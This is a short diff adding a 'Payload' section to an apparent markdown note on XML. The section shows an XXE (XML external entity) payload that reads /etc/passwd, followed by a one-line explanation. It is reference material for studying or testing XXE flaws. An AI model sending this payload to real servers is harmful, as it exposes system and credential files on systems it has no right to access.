@@ -26,3 +26,11 @@ In XML:
 </note>
 ```
 
+### Payload
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
+This sets `read` to value of `SYSTEM + path_file`.
